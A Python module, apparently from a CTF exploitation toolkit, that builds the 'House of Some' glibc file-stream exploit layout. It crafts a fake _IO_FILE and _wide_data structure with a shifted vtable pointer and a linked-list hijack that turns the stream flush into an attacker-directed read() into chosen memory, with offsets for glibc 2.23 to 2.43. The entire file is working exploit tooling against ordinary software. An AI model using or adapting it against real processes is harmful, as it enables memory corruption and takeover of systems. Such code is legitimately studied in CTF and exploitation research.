"""House of Some first-hop FILE sink layout builder."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
UINT32_LIMIT = 1 << 32

FILE_FLAGS = 0x00
FILE_READ_BASE = 0x18
FILE_READ_PTR = 0x20
FILE_READ_END = 0x28
FILE_WRITE_END = 0x30
FILE_BUF_BASE = 0x38
FILE_BUF_END = 0x40
FILE_FILENO = 0x70
FILE_CODECVT = 0x98
FILE_WIDE_DATA = 0xA0
FILE_MODE = 0xC0
FILE_VTABLE = 0xD8
FILE_PREVCHAIN = 0xB8
FILE_IMAGE_SIZE = 0xE0

WIDE_WRITE_BASE = 0x18
WIDE_WRITE_PTR = 0x20
WIDE_BUF_BASE = 0x30

FLAG_IO_LINKED = 0x80

WIDE_VTABLE_OFFSETS = {
    **{f"2.{minor}": 0x130 for minor in range(23, 30)},
    "2.30": 0xF0,
}
WIDE_VTABLE_OFFSETS.update({f"2.{minor}": 0xE0 for minor in range(31, 44)})

WIDE_VTABLE_SHIFT = -0x48


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_some(
    version: str,
    *,
    file_addr: int,
    wide_addr: int,
    file_jumps_addr: int,
    wfile_jumps_addr: int,
    target_addr: int,
    target_length: int,
    fd: int,
    lock_addr: int,
    list_all_addr: int,
    prevchain_addr: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """生成 Some 第一跳：flush 链进入 read(fd, target, length)。

    version: 选择 wide_data ABI。
    file_addr/wide_addr: fake FILE 和 fake wide_data 地址。
    file_jumps_addr: `_IO_file_jumps`，用于 wide vtable -0x48。
    wfile_jumps_addr: 合法 primary `_IO_wfile_jumps`。
    target_addr/target_length/fd: 第一跳 read 的目标、长度和文件
        描述符。
    lock_addr: FILE `_lock` 地址；list_all_addr: `_IO_list_all` 槽地址。
    prevchain_addr: 2.40+ 的 `_prevchain`，通常为 list_all_addr。
    """

    if version not in WIDE_VTABLE_OFFSETS:
        raise ValueError("House of Some supports glibc 2.23 through 2.43")

    for name, value in {
        "file_addr": file_addr,
        "wide_addr": wide_addr,
        "file_jumps_addr": file_jumps_addr,
        "wfile_jumps_addr": wfile_jumps_addr,
        "target_addr": target_addr,
        "lock_addr": lock_addr,
        "list_all_addr": list_all_addr,
    }.items():
        _check_uint64(name, value)

    if target_length <= 0 or target_length >= UINT64_LIMIT:
        raise ValueError("invalid target length")
    if fd < 0 or fd >= UINT32_LIMIT:
        raise ValueError("fd must fit uint32")

    target_end = target_addr + target_length
    _check_uint64("target_end", target_end)

    wide_vtable_offset = WIDE_VTABLE_OFFSETS[version]

    file_image = bytearray(FILE_IMAGE_SIZE)
    file_image[FILE_FLAGS:FILE_FLAGS + 8] = FLAG_IO_LINKED.to_bytes(8, "little")
    file_image[FILE_READ_BASE:FILE_READ_BASE + 8] = _pack64(target_addr)
    file_image[FILE_READ_PTR:FILE_READ_PTR + 8] = _pack64(target_addr)
    file_image[FILE_READ_END:FILE_READ_END + 8] = _pack64(target_addr)
    file_image[FILE_WRITE_END:FILE_WRITE_END + 8] = _pack64(target_end)
    file_image[FILE_BUF_BASE:FILE_BUF_BASE + 8] = _pack64(target_addr)
    file_image[FILE_BUF_END:FILE_BUF_END + 8] = _pack64(target_end)
    file_image[FILE_FILENO:FILE_FILENO + 4] = fd.to_bytes(4, "little")
    file_image[FILE_CODECVT:FILE_CODECVT + 8] = _pack64(0)
    file_image[FILE_WIDE_DATA:FILE_WIDE_DATA + 8] = _pack64(wide_addr)
    file_image[FILE_MODE:FILE_MODE + 4] = (2).to_bytes(4, "little")
    file_image[FILE_VTABLE:FILE_VTABLE + 8] = _pack64(wfile_jumps_addr)

    if version >= "2.40":
        if prevchain_addr is None:
            raise ValueError("2.40+ requires prevchain_addr")
        _check_uint64("prevchain_addr", prevchain_addr)
        file_image[FILE_PREVCHAIN:FILE_PREVCHAIN + 8] = _pack64(prevchain_addr)

    wide_image = bytearray(wide_vtable_offset + 8)
    wide_image[WIDE_WRITE_BASE:WIDE_WRITE_BASE + 8] = _pack64(0)
    wide_image[WIDE_WRITE_PTR:WIDE_WRITE_PTR + 8] = _pack64(1)
    wide_image[WIDE_BUF_BASE:WIDE_BUF_BASE + 8] = _pack64(0)
    wide_image[wide_vtable_offset:wide_vtable_offset + 8] = _pack64(
        file_jumps_addr + WIDE_VTABLE_SHIFT
    )

    return (
        MemoryWrite(file_addr, bytes(file_image), f"FILE ({version})"),
        MemoryWrite(wide_addr, bytes(wide_image), f"wide_data ({version})"),
    )
